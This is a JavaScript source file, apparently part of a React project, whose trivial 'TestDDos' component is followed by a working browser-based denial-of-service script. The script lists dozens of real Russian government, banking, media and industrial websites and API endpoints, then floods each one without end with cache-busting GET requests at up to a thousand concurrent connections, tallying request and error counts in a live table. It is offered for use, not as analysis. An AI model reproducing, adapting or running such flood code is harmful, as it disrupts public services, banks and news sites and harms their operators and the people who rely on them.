import React from 'react'

export default function TestDDos() {
  return (
    <div>TestDDos</div>
  )
}

////////////////////////////////////DDos///////////////////////////////////////////////////////////////////////////////////

var targets = [
  'https://lenta.ru/',
  'https://ria.ru/',
  'https://ria.ru/lenta/',
  'https://www.rbc.ru/',
  'https://www.rt.com/',
  'http://kremlin.ru/',
  'http://en.kremlin.ru/',
  'https://smotrim.ru/',
  'https://tass.ru/',
  'https://tvzvezda.ru/',
  'https://vsoloviev.ru/',
  'https://www.1tv.ru/',
  'https://www.vesti.ru/',
  'https://online.sberbank.ru/',
  'https://sberbank.ru/',
  'https://zakupki.gov.ru/',
  'https://www.gosuslugi.ru/',
  'https://er.ru/',
  'https://www.rzd.ru/',
  'https://rzdlog.ru/',
  'https://vgtrk.ru/',
  'https://www.interfax.ru/',
  'https://www.mos.ru/uslugi/',
  'http://government.ru/',
  'https://mil.ru/',
  'https://www.nalog.gov.ru/',
  'https://customs.gov.ru/',
  'https://pfr.gov.ru/',
  'https://rkn.gov.ru/',
  'https://www.gazprombank.ru/',
  'https://www.vtb.ru/',
  'https://www.gazprom.ru/',
  'https://lukoil.ru',
  'https://magnit.ru/',
  'https://www.nornickel.com/',
  'https://www.surgutneftegas.ru/',
  'https://www.tatneft.ru/',
  'https://www.evraz.com/ru/',
  'https://nlmk.com/',
  'https://www.sibur.ru/',
  'https://www.severstal.com/',
  'https://www.metalloinvest.com/',
  'https://nangs.org/',
  'https://rmk-group.ru/ru/',
  'https://www.tmk-group.ru/',
  'https://yandex.ru/',
  'https://yandex.by/',
  'https://www.polymetalinternational.com/ru/',
  'https://www.uralkali.com/ru/',
  'https://www.eurosib.ru/',
  'https://omk.ru/',
  'https://mail.rkn.gov.ru/',
  'https://cloud.rkn.gov.ru/',
  'https://mvd.gov.ru/',
  'https://pwd.wto.economy.gov.ru/',
  'https://stroi.gov.ru/',
  'https://proverki.gov.ru/',
  'https://www.gazeta.ru/',
  'https://www.crimea.kp.ru/',
  'https://www.kommersant.ru/',
  'https://riafan.ru/',
  'https://www.mk.ru/',
  'https://api.sberbank.ru/prod/tokens/v2/oauth',
  'https://api.sberbank.ru/prod/tokens/v2/oidc',
  'https://www.vedomosti.ru/',
  'https://sputnik.by/',
]

var targetStats = {}
targets.forEach((target) => {
  targetStats[target] = { number_of_requests: 0, number_of_errored_responses: 0 }
})

var statsEl = document.getElementById('stats');
function printStats() {
  statsEl.innerHTML = '<table width="100%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targetStats).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
}
setInterval(printStats, 1000);

var CONCURRENCY_LIMIT = 1000
var queue = []

async function fetchWithTimeout(resource, options) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), options.timeout);
  return fetch(resource, {
    method: 'GET',
    mode: 'no-cors',
    signal: controller.signal
  }).then((response) => {
    clearTimeout(id);
    return response;
  }).catch((error) => {
    clearTimeout(id);
    throw error;
  });
}

async function flood(target) {
  for (var i = 0;; ++i) {
    if (queue.length > CONCURRENCY_LIMIT) {
      await queue.shift()
    }
    
    rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)

    queue.push(
      fetchWithTimeout(target+rand, { timeout: 1000 })
        .catch((error) => {
          if (error.code === 20 /* ABORT */) {
            return;
          }
          targetStats[target].number_of_errored_responses++;
        })
        .then((response) => {
          if (response && !response.ok) {
            targetStats[target].number_of_errored_responses++;
          }
          targetStats[target].number_of_requests++;
        })

    )
  }
}

targets.map(flood)
